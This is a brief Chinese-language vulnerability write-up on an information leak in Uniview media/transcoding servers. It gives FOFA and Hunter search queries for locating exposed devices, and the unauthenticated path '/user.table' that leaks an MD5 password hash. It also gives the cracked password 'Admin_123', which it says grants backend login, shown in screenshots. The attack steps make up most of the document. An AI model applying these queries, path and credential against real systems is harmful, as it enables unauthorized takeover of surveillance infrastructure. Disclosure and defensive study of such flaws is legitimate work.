# 浙江宇视媒体服务器-user-信息泄露漏洞

### 一、漏洞描述
浙江宇视科技有限公司创立于2011年，是一家全球公共安全和智能交通的解决方案提供商。

浙江宇视科技有限公司转码服务器配置管理系统存在密码漏洞，攻击者可利用该漏洞登录后台。

### 二、影响版本
宇视转码服务器

### 三、资产测绘
fofa: body="images/a_fill_login_right_a.gif" 

hunter: app.name=="Uniview 宇视媒体服务器"  

界面

![1714987281244-1d5f2027-bfb1-42de-950f-d29610bbd967.png](./img/4oh0GhEEmgLWqzD7/1714987281244-1d5f2027-bfb1-42de-950f-d29610bbd967-091627.png)

### 四、漏洞复现
```plain
/user.table
```

![1714987215387-1c76dcb5-ff4f-4283-bad4-eae48ed6b024.png](./img/4oh0GhEEmgLWqzD7/1714987215387-1c76dcb5-ff4f-4283-bad4-eae48ed6b024-201161.png)使用MD5解密，密码为Admin_123

![1714987514450-f760a7a9-25d7-42a5-b3eb-289504a3bd7b.png](./img/4oh0GhEEmgLWqzD7/1714987514450-f760a7a9-25d7-42a5-b3eb-289504a3bd7b-684386.png)后台界面

![1714987065893-3b381dd0-d9b8-41ce-9ed3-a1f75855f8ce.png](./img/4oh0GhEEmgLWqzD7/1714987065893-3b381dd0-d9b8-41ce-9ed3-a1f75855f8ce-848576.png)



> 更新: 2024-06-17 09:18:59  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fmgc1li99c5o7pm4>